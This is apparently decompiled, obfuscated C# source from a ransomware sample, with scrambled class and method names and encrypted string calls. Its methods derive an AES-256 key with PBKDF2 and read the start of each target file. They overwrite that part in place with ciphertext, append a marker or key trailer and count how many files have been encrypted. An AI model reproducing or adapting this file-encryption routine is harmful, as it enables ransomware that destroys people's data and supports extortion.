using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace zvenNXaGjQywAfJS;

public static class pztwxceNvBEECh
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] PrbeKidGGjvRDJA(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = vuDWEjKhQvyhg(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes vuDWEjKhQvyhg(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] gvGKdDcaUqNYg(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (AFNAiOPxfKG.VvpOdAIUVnqJzW == getString_0(107396812))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (AFNAiOPxfKG.zObGGMIceXoVAZ)
			{
				try
				{
					File.AppendAllText(AFNAiOPxfKG.nzrzeINFdi, getString_0(107393024) + string_0 + getString_0(107408376) + ex.Message + getString_0(107396638));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void LtuLFdTpnGb(string NuxIUSruribeoZ, byte[] qOqKYvDIyDIVu, byte[] zmckcQUytJzy = null)
	{
		try
		{
			byte[] array = null;
			if (AFNAiOPxfKG.VvpOdAIUVnqJzW == getString_0(107396812))
			{
				array = (AFNAiOPxfKG.RoDeoCKBnUdhS ? Encoding.ASCII.GetBytes(AFNAiOPxfKG.KfBmpaPpRy(AFNAiOPxfKG.KyyvCOSpbyrlwCK) + AFNAiOPxfKG.KfBmpaPpRy(getString_0(107408286)) + Convert.ToString(AFNAiOPxfKG.raHMniyIxZuJCC) + AFNAiOPxfKG.KfBmpaPpRy(getString_0(107408286))) : Encoding.ASCII.GetBytes(AFNAiOPxfKG.KfBmpaPpRy(AFNAiOPxfKG.KyyvCOSpbyrlwCK) + AFNAiOPxfKG.KfBmpaPpRy(getString_0(107408295)) + Convert.ToString(AFNAiOPxfKG.raHMniyIxZuJCC) + AFNAiOPxfKG.KfBmpaPpRy(getString_0(107408295))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(NuxIUSruribeoZ, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(qOqKYvDIyDIVu, 0, qOqKYvDIyDIVu.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(NuxIUSruribeoZ, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!AFNAiOPxfKG.RoDeoCKBnUdhS)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(zmckcQUytJzy, 0, zmckcQUytJzy.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (AFNAiOPxfKG.RoDeoCKBnUdhS ? Encoding.ASCII.GetBytes(AFNAiOPxfKG.KfBmpaPpRy(AFNAiOPxfKG.KyyvCOSpbyrlwCK) + AFNAiOPxfKG.KfBmpaPpRy(getString_0(107408286)) + Convert.ToString(AFNAiOPxfKG.raHMniyIxZuJCC) + AFNAiOPxfKG.KfBmpaPpRy(getString_0(107408286))) : Encoding.ASCII.GetBytes(AFNAiOPxfKG.KfBmpaPpRy(AFNAiOPxfKG.KyyvCOSpbyrlwCK) + AFNAiOPxfKG.KfBmpaPpRy(getString_0(107408295)) + Convert.ToString(AFNAiOPxfKG.raHMniyIxZuJCC) + AFNAiOPxfKG.KfBmpaPpRy(getString_0(107408295))));
				FileStream fileStream2 = new FileStream(NuxIUSruribeoZ, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(qOqKYvDIyDIVu, 0, qOqKYvDIyDIVu.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(NuxIUSruribeoZ, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!AFNAiOPxfKG.RoDeoCKBnUdhS)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(zmckcQUytJzy, 0, zmckcQUytJzy.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			AFNAiOPxfKG.ECVrzbpNTQco++;
		}
		catch (Exception ex)
		{
			if (AFNAiOPxfKG.zObGGMIceXoVAZ)
			{
				try
				{
					File.AppendAllText(AFNAiOPxfKG.nzrzeINFdi, getString_0(107393024) + NuxIUSruribeoZ + getString_0(107408309) + ex.Message + getString_0(107396638));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (AFNAiOPxfKG.RoDeoCKBnUdhS ? Encoding.ASCII.GetBytes(AFNAiOPxfKG.KfBmpaPpRy(AFNAiOPxfKG.KyyvCOSpbyrlwCK) + AFNAiOPxfKG.KfBmpaPpRy(getString_0(107408286)) + Convert.ToString(AFNAiOPxfKG.raHMniyIxZuJCC) + AFNAiOPxfKG.KfBmpaPpRy(getString_0(107408286))) : Encoding.ASCII.GetBytes(AFNAiOPxfKG.KfBmpaPpRy(AFNAiOPxfKG.KyyvCOSpbyrlwCK) + AFNAiOPxfKG.KfBmpaPpRy(getString_0(107408295)) + Convert.ToString(AFNAiOPxfKG.raHMniyIxZuJCC) + AFNAiOPxfKG.KfBmpaPpRy(getString_0(107408295))));
			FileStream fileStream4 = new FileStream(NuxIUSruribeoZ, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(qOqKYvDIyDIVu, 0, qOqKYvDIyDIVu.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(NuxIUSruribeoZ, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!AFNAiOPxfKG.RoDeoCKBnUdhS)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(zmckcQUytJzy, 0, zmckcQUytJzy.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}

	static pztwxceNvBEECh()
	{
		Strings.CreateGetStringDelegate(typeof(pztwxceNvBEECh));
	}
}
